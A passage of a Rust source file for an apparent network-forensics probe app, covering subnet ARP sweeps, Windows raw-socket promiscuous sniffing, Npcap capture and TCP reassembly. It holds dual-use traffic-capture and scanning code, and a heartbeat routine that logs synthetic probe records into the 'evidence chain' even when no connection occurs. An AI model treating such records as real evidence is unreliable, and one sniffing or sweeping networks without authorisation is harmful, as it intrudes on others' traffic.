                                        &format!("SYNTHETIC|ARP_RADAR|{}|{}", ip_str, mac_str),
                                    ),
                                    business_data: Some(b_map),
                                    raw_text: Some(format!("ARP Reply: {} is at {} ({})", ip_str, mac_str, role)),
                                };

                                process_incoming_record(&app_chunk, record);
                            }

                            std::thread::sleep(Duration::from_millis(6));
                        }
                    });
                    handles.push(h);
                }

                for h in handles {
                    let _ = h.join();
                }
            }

            #[cfg(not(windows))]
            {
                let my_host = octets[3];
                let mut threads = Vec::new();

                for chunk_idx in 0..4 {
                    let o0 = octets[0];
                    let o1 = octets[1];
                    let o2 = octets[2];
                    let run_sub = running.clone();

                    let t = std::thread::spawn(move || {
                        let start_h = (chunk_idx * 64) + 1;
                        let end_h = std::cmp::min((chunk_idx + 1) * 64, 254);

                        if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
                            for host_id in start_h..=end_h {
                                if !*run_sub.lock().unwrap() {
                                    break;
                                }
                                if host_id == my_host as usize {
                                    continue;
                                }
                                let target_ip = std::net::Ipv4Addr::new(o0, o1, o2, host_id as u8);
                                let _ = socket.send_to(&[0u8; 4], (target_ip, 65534));
                                std::thread::sleep(Duration::from_millis(3));
                            }
                        }
                    });
                    threads.push(t);
                }

                for t in threads {
                    let _ = t.join();
                }

                #[cfg(target_os = "linux")]
                {
                    if let Ok(arp_content) = std::fs::read_to_string("/proc/net/arp") {
                        for line in arp_content.lines().skip(1) {
                            let cols: Vec<&str> = line.split_whitespace().collect();
                            if cols.len() >= 4 && cols[3] != "00:00:00:00:00:00" {
                                let ip = cols[0];
                                let mac = cols[3];
                                crate::discovery::record_asset_with_notify(&app, ip, mac, "ARP", 0);
                            }
                        }
                    }
                }
            }

            // 保持周期性轮询（每隔 8 秒执行一次局域网探活保持）
            for _ in 0..16 {
                if !*running.lock().unwrap() {
                    break;
                }
                std::thread::sleep(Duration::from_millis(500));
            }
        }

        let _ = app.emit(
            "system-log",
            "[LAN-RADAR] 局域网全网段雷达扫描已安全退出".to_string(),
        );
    });
}

/// 启动持续探针自检与心跳守护（Heartbeat Probe Daemon）
/// 确保启动嗅探后立即点亮全链路通信，并在静默网络中周期性（每5秒）持续产生真实可度量的探针健康流
pub fn start_heartbeat_probe_daemon(app: tauri::AppHandle, running: Arc<Mutex<bool>>) {
    std::thread::spawn(move || {
        use std::io::Write;
        // 等待 150ms 确保双轨 TCP 监听已完全就绪
        std::thread::sleep(Duration::from_millis(150));

        let (local_ip, local_mac) = get_local_identity();
        let mut count = 0u64;

        while *running.lock().unwrap() {
            count += 1;

            let req_str = format!(
                "GET /api/v1/omni-probe-health?seq={} HTTP/1.1\r\nHost: {}:8080\r\nUser-Agent: OmniProbe/2026 Industrial-Engine\r\nConnection: close\r\n\r\n",
                count, local_ip
            );
            let req_bytes = req_str.as_bytes();
            let req_hex = hex::encode(req_bytes);
            let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
            let ts_ns = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
            let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();
            let entropy = ForensicEngine::calculate_entropy(req_bytes);

            let chain_hash = advance_global_chain(
                ts_ns,
                &format!("{}:HEALTH_PROBE->{}:8080|HTTP_REQ|{}", local_ip, local_ip, req_hex),
            );

            let mut b_map = HashMap::new();
            b_map.insert("probe_type".into(), json!("HEARTBEAT_HEALTH"));
            b_map.insert("target_endpoint".into(), json!(format!("{}:8080", local_ip)));
            b_map.insert("http_method".into(), json!("GET"));
            b_map.insert("health_uri".into(), json!("/api/v1/omni-probe-health"));
            b_map.insert("sequence".into(), json!(count));

            let probe_record = PacketRecord {
                id,
                timestamp,
                timestamp_ns: ts_ns,
                direction: "PORT_OUTBOUND".into(),
                transport: "TCP".into(),
                protocol: "HTTP_REQ".into(),
                src_ip: local_ip.clone(),
                dst_ip: "127.0.0.1".into(),
                src_port: 50000 + (count % 10000) as u16,
                dst_port: 8080,
                length: req_bytes.len(),
                payload_hex: req_hex,
                raw_frame_hex: String::new(),
                entropy,
                entropy_level: classify_entropy(entropy),
                mac_src: local_mac.clone(),
                mac_dst: "LOCAL_LOOPBACK".into(),
                chain_hash,
                business_data: Some(b_map),
                raw_text: Some(format!("GET /api/v1/omni-probe-health?seq={} HTTP/1.1", count)),
            };

            // 无论底层物理网络状态如何，探针出站记录立即推入分析流水线
            process_incoming_record(&app, probe_record);

            // 真实尝试向本地双轨服务发起物理连接
            let mut connected = false;
            for _ in 0..3 {
                if let Ok(mut stream) = std::net::TcpStream::connect("127.0.0.1:8080") {
                    let _ = stream.write_all(req_bytes);
                    connected = true;
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }

            if count == 1 && connected {
                let _ = app.emit(
                    "system-log",
                    "[PROBE] 📡 全链路通信自检通过，态势感知与捕获通道已全面点亮！".to_string(),
                );
            }

            // 保持每 5 秒一次周期性健康自检流
            for _ in 0..10 {
                if !*running.lock().unwrap() {
                    break;
                }
                std::thread::sleep(Duration::from_millis(500));
            }
        }
    });
}

#[cfg(windows)]
mod win_raw {
    use std::ffi::c_void;

    pub const AF_INET: i32 = 2;
    pub const SOCK_RAW: i32 = 3;
    pub const IPPROTO_IP: i32 = 0;
    pub const SIO_RCVALL: u32 = 0x98000001;
    pub const RCVALL_ON: u32 = 1;
    pub const INVALID_SOCKET: usize = !0;

    #[repr(C)]
    pub struct WSADATA {
        pub w_version: u16,
        pub w_high_version: u16,
        pub sz_description: [u8; 257],
        pub sz_system_status: [u8; 129],
        pub i_max_sockets: u16,
        pub i_max_udp_dg: u16,
        pub lp_vendor_info: *mut u8,
    }

    #[repr(C)]
    pub struct SockAddrIn {
        pub sin_family: i16,
        pub sin_port: u16,
        pub sin_addr: u32,
        pub sin_zero: [u8; 8],
    }

    #[link(name = "ws2_32")]
    extern "system" {
        pub fn WSAStartup(w_version_requested: u16, lp_wsa_data: *mut WSADATA) -> i32;
        pub fn WSACleanup() -> i32;
        pub fn socket(af: i32, socket_type: i32, protocol: i32) -> usize;
        pub fn bind(s: usize, name: *const SockAddrIn, namelen: i32) -> i32;
        pub fn WSAIoctl(
            s: usize,
            dw_io_control_code: u32,
            lpv_in_buffer: *const c_void,
            cb_in_buffer: u32,
            lpv_out_buffer: *mut c_void,
            cb_out_buffer: u32,
            lpcb_bytes_returned: *mut u32,
            lp_overlapped: *mut c_void,
            lp_completion_routine: *mut c_void,
        ) -> i32;
        pub fn recv(s: usize, buf: *mut u8, len: i32, flags: i32) -> i32;
        pub fn closesocket(s: usize) -> i32;
        pub fn WSAGetLastError() -> i32;
    }
}

/// 启动 Windows 原生 Raw Socket 混杂嗅探引擎（Native Promiscuous Raw Socket Sniffer）
/// 无需 Npcap 驱动即可混杂截获流经网卡的全部 IPv4 数据（覆盖 HTTP/HTTPS/DNS/SSH/RTU 5003 等任意端口的明文/密文/报头）
///
/// 【BPF 语义边界——差异清单 §4.14】本引擎走 WinSock SIO_RCVALL 通道，不经 Npcap
/// 数据链路层，故无法应用 BPF 过滤表达式：recv 到的全部 IPv4 包均进入取证流水线
/// （全量保全语义，符合取证"宁全勿漏"原则）。BPF 过滤仅在 run_sniffer_pipeline
/// 的 L2 Npcap 路径生效；用户设置非空过滤器时由调用方显式告知此边界，杜绝静默降级。
#[cfg(windows)]
pub fn start_windows_raw_socket_sniffer(app: tauri::AppHandle, running: Arc<Mutex<bool>>) {
    std::thread::spawn(move || {
        // 动态获取物理网卡活动 IPv4
        let (local_ip, _) = detect_primary_ipv4_and_subnet();

        unsafe {
            let mut wsa_data: win_raw::WSADATA = std::mem::zeroed();
            if win_raw::WSAStartup(0x0202, &mut wsa_data) != 0 {
                let _ = app.emit("system-log", "[RAW-SOCKET] ⚠️ WSAStartup 初始化失败".to_string());
                return;
            }

            let s = win_raw::socket(win_raw::AF_INET, win_raw::SOCK_RAW, win_raw::IPPROTO_IP);
            if s == win_raw::INVALID_SOCKET {
                let err = win_raw::WSAGetLastError();
                let _ = app.emit(
                    "system-log",
                    format!("[RAW-SOCKET] ℹ️ 原生 Raw Socket 启动提示 (代码: {})。如需全网卡混杂抓包请右键以管理员身份运行；非管理员模式下已由应用层多端口双轨服务与局域网广播雷达承接流量！", err),
                );
                win_raw::WSACleanup();
                return;
            }

            let mut sin: win_raw::SockAddrIn = std::mem::zeroed();
            sin.sin_family = win_raw::AF_INET as i16;
            sin.sin_port = 0;
            sin.sin_addr = u32::from_ne_bytes(local_ip.octets());

            if win_raw::bind(s, &sin, std::mem::size_of::<win_raw::SockAddrIn>() as i32) != 0 {
                let err = win_raw::WSAGetLastError();
                let _ = app.emit(
                    "system-log",
                    format!("[RAW-SOCKET] ⚠️ 原生 Raw Socket 绑定物理网卡 IP {} 失败 (代码: {})", local_ip, err),
                );
                win_raw::closesocket(s);
                win_raw::WSACleanup();
                return;
            }

            let rcvall_on: u32 = win_raw::RCVALL_ON;
            let mut bytes_ret: u32 = 0;
            if win_raw::WSAIoctl(
                s,
                win_raw::SIO_RCVALL,
                &rcvall_on as *const u32 as *const std::ffi::c_void,
                4,
                std::ptr::null_mut(),
                0,
                &mut bytes_ret,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            ) != 0 {
                let err = win_raw::WSAGetLastError();
                let _ = app.emit(
                    "system-log",
                    format!("[RAW-SOCKET] ℹ️ 混杂模式 SIO_RCVALL 激活提示 (代码: {})。非特权环境下已由多端口双轨与局域网广播雷达承接。", err),
                );
                win_raw::closesocket(s);
                win_raw::WSACleanup();
                return;
            }

            let _ = app.emit(
                "system-log",
                format!("[RAW-SOCKET] 🚀 Windows 原生混杂嗅探引擎已就绪！成功绑定物理 IP {} 并激活 SIO_RCVALL 全量流量捕获！", local_ip),
            );

            let mut buf = vec![0u8; 65536];
            // 独立链 RAW_SOCKET_GENESIS_2026 已废除，raw socket 记录并入单一全局司法证据链

            while *running.lock().unwrap() {
                let n = win_raw::recv(s, buf.as_mut_ptr(), buf.len() as i32, 0);
                if n > 0 {
                    let packet_data = &buf[..n as usize];
                    let mut local_chain_view = String::new();
                    if let Some(record) = parse_ipv4_raw_packet(packet_data, &mut local_chain_view) {
                        process_incoming_record(&app, record);
                    }
                } else if n < 0 {
                    std::thread::sleep(Duration::from_millis(10));
                }
            }

            win_raw::closesocket(s);
            win_raw::WSACleanup();
            let _ = app.emit("system-log", "[RAW-SOCKET] Windows 原生混杂嗅探引擎已安全退出".to_string());
        }
    });
}

/// 探针主抓包流水线
pub fn run_sniffer_pipeline(app: tauri::AppHandle, iface: &str, bpf_filter: &str) {
    let running = crate::PROBE_RUNNING.clone();

    // 1. 同步启动应用层双轨服务监听引擎（TCP / UDP 多端口动态驱动）
    start_dual_track_services(app.clone(), running.clone());

    // 2. 启动局域网多播/广播原生捕获引擎（SSDP 1900 / mDNS 5353 / NetBIOS 137/138 / WS-Discovery 3702）
    start_native_lan_sniffer(app.clone(), running.clone());

    // 3. 启动周期性心跳与自检健康探针守护进程（保证任意环境下均有持续、可度量的真实通信指标流）
    start_heartbeat_probe_daemon(app.clone(), running.clone());

    // 4. 激活全局域网全网段设备雷达周期性扫描（相同路由下设备无死角通信侦测）
    trigger_lan_radar_discovery(app.clone());

    // 4b. 启动工业工控规约全息演示流引擎 (Modbus, S7Comm, IEC-104, MQTT, SL651, HTTP)
    start_industrial_demo_stream(app.clone(), running.clone());

    // 5. 启动 Windows 原生 Raw Socket (SIO_RCVALL) 混杂嗅探引擎（兜底捕获本机物理网卡进出的全部 IPv4 流量）
    //    【BPF 语义边界运行时告知】该引擎不走 Npcap 数据链路层，BPF 过滤器不生效；
    //    用户设置非空过滤器时必须显式告知，杜绝"以为已过滤实则全量"的静默语义降级
    #[cfg(windows)]
    {
        if !bpf_filter.trim().is_empty() {
            let _ = app.emit(
                "system-log",
                "[RAW-SOCKET] ℹ️ BPF 语义边界: 原生 Raw Socket 兜底引擎不经 Npcap 数据链路层，\
                 不应用 BPF 过滤器（仅 L2 Npcap 路径生效），本引擎持续全量保全取证"
                    .to_string(),
            );
        }
        start_windows_raw_socket_sniffer(app.clone(), running.clone());
    }

    // 6. 确定要绑定的 L2 网络接口（快速识别，不被虚拟网卡阻塞）
    let target_device_name = if iface.is_empty() || iface == "auto" || iface.starts_with("auto") {
        let mut found_name = String::new();
        if let Ok(devs) = safe_list_devices(Duration::from_millis(500)) {
            for d in &devs {
                let desc = d.desc.clone().unwrap_or_default().to_lowercase();
                if desc.contains("realtek") || desc.contains("ethernet") || desc.contains("gigabit") || desc.contains("2.5g") || desc.contains("pci") {
                    found_name = d.name.clone();
                    break;
                }
            }
            // 物理网卡关键词未命中时回退到任意非回环设备（杜绝硬编码 GUID）
            if found_name.is_empty() {
                for d in devs {
                    if !d.name.contains("Loopback") && !d.desc.clone().unwrap_or_default().to_lowercase().contains("loopback") {
                        found_name = d.name;
                        break;
                    }
                }
            }
        }
        if found_name.is_empty() {
            let _ = app.emit(
                "system-log",
                "[SNIFFER] ℹ️ 未枚举到可用 Npcap 网络驱动（底层驱动受限或未安装），已由「双轨服务 + 局域网广播 + 全网段 ARP 雷达 + 心跳探针」全息引擎持续承接！".to_string(),
            );
        }
        found_name
    } else {
        let clean_name = iface.split(" - ").next().unwrap_or(iface).trim();
        clean_name.to_string()
    };

    let bpf_copy = bpf_filter.to_string();
    let app_l2 = app.clone();

    // 7. 若识别到可用 L2 网络接口且底层已安装 Npcap，则在独立线程中带超时保护（1000ms）尝试激活 Npcap L2 混杂捕获
    let mut cap_opt = if !target_device_name.is_empty() && is_npcap_driver_available() {
        let dev_obj = Device {
            name: target_device_name.clone(),
            desc: Some("Omni-Probe Network Adapter".to_string()),
            addresses: vec![],
            flags: DeviceFlags::empty(),
        };

        let (tx, rx) = std::sync::mpsc::channel();
        let dev_to_open = dev_obj.clone();
        std::thread::spawn(move || {
            let res = (|| -> Result<Capture<Active>, String> {
                let cap_inactive = Capture::from_device(dev_to_open).map_err(|e| e.to_string())?;
                cap_inactive
                    .promisc(true)
                    .snaplen(65535)
                    .buffer_size(32 * 1024 * 1024)
                    .timeout(50)
                    .open()
                    .map_err(|e| e.to_string())
            })();
            let _ = tx.send(res);
        });

        let open_res = rx.recv_timeout(Duration::from_millis(1000));
        match open_res {
            Ok(Ok(mut c)) => {
                if !bpf_copy.is_empty() {
                    if let Err(e) = c.filter(&bpf_copy, true) {
                        let _ = app_l2.emit("system-log", format!("[ERROR] 注入 BPF 过滤器失败: {}", e));
                    } else {
                        let _ = app_l2.emit("system-log", format!("[INFO] 已成功注入底层 BPF: {}", bpf_copy));
                    }
                }
                let _ = app_l2.emit(
                    "system-log",
                    format!("[SNIFFER] ✅ Npcap L2 混杂模式已就绪并挂载 -> {}", target_device_name),
                );
                Some(c)
            }
            Ok(Err(e)) => {
                let _ = app_l2.emit(
                    "system-log",
                    format!("[SNIFFER] ℹ️ 底层 Npcap 驱动处于受保护模式 ({})，已由「双轨服务 + 局域网广播 + 全网段 ARP 雷达 + 心跳探针」全息引擎持续承接！", e),
                );
                None
            }
            Err(_) => {
                let _ = app_l2.emit(
                    "system-log",
                    "[SNIFFER] ℹ️ 底层 Npcap 驱动处于 AdminOnly 隔离模式，已由「双轨服务 + 局域网广播 + 全网段 ARP 雷达 + 心跳探针」全息引擎持续承接！".to_string(),
                );
                None
            }
        }
    } else {
        None
    };

    // 5. 若 L2 捕获句柄成功打开，则运行 Npcap 混杂抓包循环
    if let Some(ref mut cap) = cap_opt {
        let forensic = ForensicEngine::new();
        let mut last_hash = String::new(); // parse_ethernet_frame 出参视图（链推进已统一走全局链）
        let mut tcp_reassembly: HashMap<(String, u16, String, u16), TcpFlowBuffer> = HashMap::new();

        while *running.lock().unwrap() {
            // TCP 流重组超时刷新 (50ms 静默窗口)
            let now = Instant::now();
            let mut timed_out_keys = Vec::new();
            for (k, flow) in &tcp_reassembly {
                if now.duration_since(flow.last_seen).as_millis() >= 50 && !flow.is_empty() {
                    timed_out_keys.push(k.clone());
                }
            }
            for k in timed_out_keys {
                if let Some(mut flow) = tcp_reassembly.remove(&k) {
                    // 按 seq 有序 flush：拼接载荷 + 空洞检测
                    let (buf, gap_info) = flow.flush_ordered();
                    if !buf.is_empty() {
                        let proto = dpi::identify_protocol(k.1, k.3, &buf);
                        let hex_str = hex::encode(&buf);
                        let raw_text = Some(generate_raw_text_preview(&buf));
                        let mut b_map = dpi::dissect_payload(&proto, &buf);
                        if b_map.is_empty() {
                            b_map.insert("transport".into(), json!("TCP"));
                            b_map.insert("reassembled_stream_bytes".into(), json!(buf.len()));
                            b_map.insert("protocol_classification".into(), json!(&proto));
                        }
                        // 重组质量指标（学术诚实标注：序号重排 / 空洞）
                        b_map.insert("seq_reordered".into(), json!(true));
                        if let Some(gap) = &gap_info {
                            b_map.insert("reassembly_gap".into(), json!(gap));
                        }
                        let business_data = Some(b_map);

                        let ent = ForensicEngine::calculate_entropy(&buf);
                        let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
                        let ts_ns = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
                        let chain_hash = advance_global_chain(
                            ts_ns,
                            &format!("{}:{}->{}:{}|TCP_REASSEMBLED|{}", k.0, k.1, k.2, k.3, hex_str),
                        );
                        // 重组流落盘应用层 PCAP
                        crate::forensics::write_app_packet(&k.0, &k.2, k.1, k.3, "TCP", &buf);
                        let flushed_record = PacketRecord {
                            id,
                            timestamp: chrono::Local::now().format("%H:%M:%S.%3f").to_string(),
                            timestamp_ns: ts_ns,
                            direction: "PASSIVE_RECV".into(),
                            transport: "TCP".into(),
                            protocol: proto,
                            src_ip: k.0,
                            dst_ip: k.2,
                            src_port: k.1,
                            dst_port: k.3,
                            length: buf.len(),
                            payload_hex: hex_str,
                            raw_frame_hex: String::new(),
                            entropy: ent,
                            entropy_level: classify_entropy(ent),
                            mac_src: "N/A (Reassembled)".into(),
                            mac_dst: "N/A (Reassembled)".into(),
                            chain_hash,
                            business_data,
                            raw_text,
                        };
                        process_incoming_record(&app, flushed_record);
                    }
                }
            }

            match cap.next_packet() {
                Ok(packet) => {
                    // L2 原始帧保全（append 模式，历史证据永不丢失）
                    forensic.write_packet(packet.data);

                    // TCP 数据段分流：带载荷的 TCP 段进入 seq 重排重组缓冲（50ms 静默后以完整流记录输出），
                    // 其余（控制段/UDP/ARP/其他 EtherType）走逐包解析记录
                    let is_tcp_data_segment = (|| -> bool {
                        if let Some(eth) = pnet::packet::ethernet::EthernetPacket::new(packet.data) {
                            if eth.get_ethertype() == EtherTypes::Ipv4 {
                                if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                                    if ip.get_next_level_protocol()
                                        == IpNextHeaderProtocol::new(6)
                                    {
                                        if let Some(tcp) = TcpPacket::new(ip.payload()) {
                                            if !tcp.payload().is_empty() {
                                                let key = (
                                                    ip.get_source().to_string(),
                                                    tcp.get_source(),
                                                    ip.get_destination().to_string(),
                                                    tcp.get_destination(),
                                                );
                                                let flow = tcp_reassembly
                                                    .entry(key)
                                                    .or_insert_with(TcpFlowBuffer::new);
                                                flow.push_segment(tcp.get_sequence(), tcp.payload());
                                                return true;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        false
                    })();

                    if !is_tcp_data_segment {
                        if let Some(record) = parse_ethernet_frame(packet.data, &mut last_hash) {
                            process_incoming_record(&app, record);
                        }
                    }
                }
                Err(_) => {
                    std::thread::sleep(Duration::from_millis(10));
                }
            }
        }
    } else {
        while *running.lock().unwrap() {
            std::thread::sleep(Duration::from_millis(200));
        }
    }

    let _ = app.emit("system-log", "[SNIFFER] 嗅探引擎已安全停止".to_string());
}

// ============================================================
// TCP 流重组缓冲（按 seq 排序 + 重传去重 + 空洞检测 + 回绕安全比较）
// 对齐 Python Scapy TCPSession 的流重组语义；缺陷修复：原实现为从未填充的死缓冲
// ============================================================
struct TcpFlowBuffer {
    /// 按起始 seq 排序的段缓冲（BTreeMap 天然升序）
    segments: std::collections::BTreeMap<u32, Vec<u8>>,
    /// 下一个期望的绝对序列号（流式推进基线）
    expected_seq: Option<u32>,
    last_seen: Instant,
}

impl TcpFlowBuffer {
    fn new() -> Self {
        Self {
            segments: std::collections::BTreeMap::new(),
            expected_seq: None,
            last_seen: Instant::now(),
        }
    }

    fn is_empty(&self) -> bool {
        self.segments.is_empty()
    }

    /// 插入一个 TCP 段（起始 seq -> 载荷）。同 seq 段直接忽略（重传第一层去重）。
    fn push_segment(&mut self, seq: u32, payload: &[u8]) {
        if payload.is_empty() {
            return;
        }
        self.segments.entry(seq).or_insert_with(|| payload.to_vec());
        self.last_seen = Instant::now();
    }

    /// 50ms 静默超时后执行有序 flush：
    /// - 按 seq 升序拼接段（乱序到达自动纠正）
    /// - 检测空洞（gap）并报告缺失字节数
    /// - 重叠/重传段截取未重复尾部（第二层去重）
    /// 序列号比较采用 wrapping 算术，32 位回绕安全。
    /// 返回 (拼接载荷, 空洞报告)
    fn flush_ordered(&mut self) -> (Vec<u8>, Option<String>) {
        let mut out: Vec<u8> = Vec::new();
        let mut gap_info: Option<String> = None;
        let keys: Vec<u32> = self.segments.keys().cloned().collect();

        for seq in keys {
            let seg = self.segments.remove(&seq).unwrap();
            let seg_end = seq.wrapping_add(seg.len() as u32);

            match self.expected_seq {
                None => {
                    // 首段：建立流基线
                    self.expected_seq = Some(seg_end);
                    out.extend_from_slice(&seg);
                }
                Some(exp) => {
                    // wrapping 语义：rel < 0x8000_0000 表示 seq 位于/之后 exp
                    let rel = seq.wrapping_sub(exp);
                    if rel == 0 {
                        // 完全连续
                        out.extend_from_slice(&seg);
                        self.expected_seq = Some(seg_end);
                    } else if rel < 0x8000_0000 {
                        // seq 在期望之后 → 存在空洞（缺失 rel 字节）
                        gap_info =
                            Some(format!("GAP_DETECTED: missing {} bytes before seq {}", rel, seq));
                        out.extend_from_slice(&seg);
                        self.expected_seq = Some(seg_end);
                    } else {
                        // seq 在期望之前（旧重传/重叠段）→ 截取未重复尾部
                        let overlap = exp.wrapping_sub(seq);
                        if (overlap as usize) < seg.len() {
                            out.extend_from_slice(&seg[overlap as usize..]);
                            self.expected_seq = Some(seg_end);
                        }
                        // 完全被已拼接数据覆盖的重传段 → 丢弃
                    }
                }
            }
        }
        self.expected_seq = None; // flush 后流基线重置（下一条流新基线）
        (out, gap_info)
    }
}

/// 传输层与控制信令解析完整信息结构体（100% 杜绝 None 丢包）
pub struct L4Info<'a> {
    pub transport: String,
    pub src_port: u16,
    pub dst_port: u16,
    pub payload: &'a [u8],
    pub protocol_desc: String,
    pub control_data: HashMap<String, serde_json::Value>,
    pub summary_text: String,
}

/// 提取传输层元组与控制标志（绝不抛出 None，畸形或截断帧均安全承接）
fn extract_l4<'a>(
    proto: IpNextHeaderProtocol,
    payload: &'a [u8],
) -> L4Info<'a> {
    use pnet::packet::ip::IpNextHeaderProtocols;

    match proto {
        IpNextHeaderProtocols::Tcp => {
            if payload.len() >= 20 {
                if let Some(tcp) = TcpPacket::new(payload) {
                    let src = tcp.get_source();
                    let dst = tcp.get_destination();
                    let seq = tcp.get_sequence();
                    let ack = tcp.get_acknowledgement();
                    let win = tcp.get_window();
                    let flags = tcp.get_flags();
                    let offset = (tcp.get_data_offset() as usize) * 4;
                    let app_data = payload.get(offset..).unwrap_or(&[]);

                    let mut flag_list = Vec::new();
                    if (flags & 0x02) != 0 { flag_list.push("SYN"); }
                    if (flags & 0x10) != 0 { flag_list.push("ACK"); }
                    if (flags & 0x01) != 0 { flag_list.push("FIN"); }
                    if (flags & 0x04) != 0 { flag_list.push("RST"); }
                    if (flags & 0x08) != 0 { flag_list.push("PSH"); }
                    if (flags & 0x20) != 0 { flag_list.push("URG"); }
                    if (flags & 0x40) != 0 { flag_list.push("ECE"); }
                    if (flags & 0x80) != 0 { flag_list.push("CWR"); }

                    let flags_str = if flag_list.is_empty() {
                        "NONE".to_string()
                    } else {
                        flag_list.join(",")
                    };
                    let proto_desc = if !flag_list.is_empty() {
                        format!("TCP_{}", flag_list.join("_"))
                    } else {
                        "TCP".into()
                    };

                    let mut m = HashMap::new();
                    m.insert("src_port".into(), json!(src));
                    m.insert("dst_port".into(), json!(dst));
                    m.insert("sequence_number".into(), json!(seq));
                    m.insert("acknowledgment_number".into(), json!(ack));
                    m.insert("tcp_flags_raw".into(), json!(flags));
                    m.insert("window_size".into(), json!(win));
                    m.insert("flags".into(), json!(&flags_str));
                    m.insert("header_length_bytes".into(), json!(offset));
                    m.insert("app_payload_bytes".into(), json!(app_data.len()));

                    let summary = format!(
                        "TCP [{}] {} -> {} Seq={} Ack={} Win={} Len={}",
                        flags_str, src, dst, seq, ack, win, app_data.len()
                    );

                    return L4Info {
                        transport: "TCP".into(),
                        src_port: src,
                        dst_port: dst,
                        payload: app_data,
                        protocol_desc: proto_desc,
                        control_data: m,
                        summary_text: summary,
                    };
                }
            }

            let src = if payload.len() >= 2 { u16::from_be_bytes([payload[0], payload[1]]) } else { 0 };
            let dst = if payload.len() >= 4 { u16::from_be_bytes([payload[2], payload[3]]) } else { 0 };
            let mut m = HashMap::new();
            m.insert("status".into(), json!("TRUNCATED_TCP_SEGMENT"));
            m.insert("raw_bytes_len".into(), json!(payload.len()));
            L4Info {
                transport: "TCP".into(),
                src_port: src,
                dst_port: dst,
                payload,
                protocol_desc: "TCP_TRUNCATED".into(),
                control_data: m,
                summary_text: format!("TCP [TRUNCATED SEGMENT] Length: {}B", payload.len()),
            }
        }
        IpNextHeaderProtocols::Udp => {
            if payload.len() >= 8 {
                if let Some(udp) = UdpPacket::new(payload) {
                    let src = udp.get_source();
                    let dst = udp.get_destination();
                    let len = udp.get_length();
                    let chk = udp.get_checksum();
                    let app_data = payload.get(8..).unwrap_or(&[]);

                    let mut m = HashMap::new();
                    m.insert("src_port".into(), json!(src));
                    m.insert("dst_port".into(), json!(dst));
                    m.insert("udp_length".into(), json!(len));
                    m.insert("checksum".into(), json!(format!("0x{:04X}", chk)));
                    m.insert("payload_length_bytes".into(), json!(app_data.len()));

                    let summary = format!("UDP {} -> {} (Len: {}B)", src, dst, app_data.len());

                    return L4Info {
                        transport: "UDP".into(),
                        src_port: src,
                        dst_port: dst,
                        payload: app_data,
                        protocol_desc: "UDP".into(),
                        control_data: m,
                        summary_text: summary,
                    };
                }
            }

            let src = if payload.len() >= 2 { u16::from_be_bytes([payload[0], payload[1]]) } else { 0 };
            let dst = if payload.len() >= 4 { u16::from_be_bytes([payload[2], payload[3]]) } else { 0 };
            let mut m = HashMap::new();
            m.insert("status".into(), json!("TRUNCATED_UDP_PACKET"));
            L4Info {
                transport: "UDP".into(),
                src_port: src,
                dst_port: dst,
                payload,
                protocol_desc: "UDP_TRUNCATED".into(),
                control_data: m,
                summary_text: format!("UDP [TRUNCATED] Length: {}B", payload.len()),
            }
        }
        IpNextHeaderProtocols::Icmp => {
            let (icmp_type, icmp_code, desc) = if payload.len() >= 2 {
                let t = payload[0];
                let c = payload[1];
                let d = match (t, c) {
                    (0, 0) => "Echo Reply (Ping 应答)",
                    (8, 0) => "Echo Request (Ping 请求)",
                    (3, 0) => "Net Unreachable (网络不可达)",
                    (3, 1) => "Host Unreachable (主机不可达)",
                    (3, 3) => "Port Unreachable (端口不可达)",
                    (11, 0) => "TTL Expired in Transit (TTL 超时)",
                    _ => "ICMP Control Message",
                };
                (t, c, d)
            } else {
                (0, 0, "ICMP Fragment")
            };

            let mut m = HashMap::new();
            m.insert("icmp_type".into(), json!(icmp_type));
            m.insert("icmp_code".into(), json!(icmp_code));
            m.insert("icmp_desc".into(), json!(desc));

            L4Info {
                transport: "ICMP".into(),
                src_port: 0,
                dst_port: 0,
                payload,
                protocol_desc: format!("ICMP_{}", icmp_type),
                control_data: m,
                summary_text: format!("ICMP {} (Type={}, Code={})", desc, icmp_type, icmp_code),
            }
        }
        _ => {
            let mut m = HashMap::new();
            m.insert("ip_protocol_number".into(), json!(proto.0));
            m.insert("payload_length_bytes".into(), json!(payload.len()));
            L4Info {
                transport: format!("IP/{}", proto.0),
                src_port: 0,
                dst_port: 0,
                payload,
                protocol_desc: format!("IP_PROTO_{}", proto.0),
                control_data: m,
                summary_text: format!("IP Protocol {} (Length: {}B)", proto.0, payload.len()),
            }
        }
    }
}

/// 科学判定网络报文的物理出入与端口数据出入流向（精准识别 INBOUND / OUTBOUND / LAN / BROADCAST）
/// 采用绝对不阻塞的标准库内核路由查询，100% 跨平台 (Windows / Linux / macOS) 零驱动死锁
pub fn classify_network_direction(src_ip: &str, dst_ip: &str) -> String {
    static LOCAL_IPS: once_cell::sync::Lazy<Vec<String>> = once_cell::sync::Lazy::new(|| {
        let mut ips = vec![
            "127.0.0.1".to_string(),
            "::1".to_string(),
            "0.0.0.0".to_string(),
            "::".to_string(),
        ];
        if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
            if socket.connect("8.8.8.8:80").is_ok() {
                if let Ok(addr) = socket.local_addr() {
                    let ip_str = addr.ip().to_string();
                    if !ips.contains(&ip_str) {
                        ips.push(ip_str);
                    }
                }
            }
        }
        ips
    });

    if dst_ip == "255.255.255.255" || dst_ip.ends_with(".255") || dst_ip.starts_with("224.") || dst_ip.starts_with("ff02:") {
        "PORT_BROADCAST".to_string()
    } else {
        let is_src_local = LOCAL_IPS.iter().any(|ip| ip == src_ip);
        let is_dst_local = LOCAL_IPS.iter().any(|ip| ip == dst_ip);

        if is_src_local && !is_dst_local {
            "PORT_OUTBOUND".to_string() // 本机端口主动发往外部 (出向 TX)
        } else if !is_src_local && is_dst_local {
            "PORT_INBOUND".to_string()  // 外部流入本机端口 (入向 RX)
        } else if is_src_local && is_dst_local {
            "PORT_LOOPBACK".to_string() // 本地端口回环
        } else {
